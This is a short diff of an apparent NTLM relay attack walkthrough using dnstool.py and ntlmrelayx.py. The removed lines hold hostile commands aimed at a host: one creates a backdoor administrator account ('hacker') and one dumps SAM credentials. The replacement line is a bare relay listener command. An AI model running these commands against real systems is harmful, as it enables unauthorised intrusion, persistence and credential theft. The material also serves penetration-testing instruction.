@@ -41,15 +41,7 @@ python dnstool.py -u 'test.com\test1' -p 'Test..111' -r win10pc1UWhRCAAAAAAAAAAA
 
 ## Step 2: Start NTLM Relay Listener
 ```bash
-# Basic command execution
-sudo ntlmrelayx.py -t 192.168.214.135 -smb2support -c "whoami"
-
-# Create backdoor admin user
-sudo ntlmrelayx.py -t 192.168.214.135 -smb2support \
-  -c "net user hacker Pass123! /add && net localgroup administrators hacker /add"
-
-# Dump credentials
-sudo ntlmrelayx.py -t 192.168.214.135 -smb2support --dump-sam
+sudo ntlmrelayx.py -t 192.168.2.3 -smb2support
 ```
 
 **Parameters**:
